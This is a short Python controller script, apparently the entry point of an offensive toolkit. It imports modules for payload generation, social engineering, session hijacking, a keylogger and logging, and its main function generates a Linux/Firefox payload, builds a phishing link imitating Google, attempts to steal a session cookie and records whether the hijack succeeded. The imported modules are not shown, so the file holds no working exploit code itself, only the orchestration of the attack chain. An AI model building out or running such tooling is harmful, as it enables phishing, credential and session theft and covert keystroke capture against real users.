# main_controller.py
import payload_generator
import social_engineering
import session_hijacking
import keylogger
import database_logger

def main():
    # Generate payload
    payload = payload_generator.generate_payload("Linux", "Firefox")
    print(f"Payload: {payload}")

    # Phishing link generation
    link = social_engineering.generate_phishing_link("google")
    print(f"Phishing Link: {link}")

    # Attempt session hijacking
    is_valid = session_hijacking.steal_cookie("sample_session_id")
    print(f"Session Hijacking: {is_valid}")

    # Log actions
    database_logger.log_action("session_hijack", "success" if is_valid else "failed")

if __name__ == "__main__":
    main()
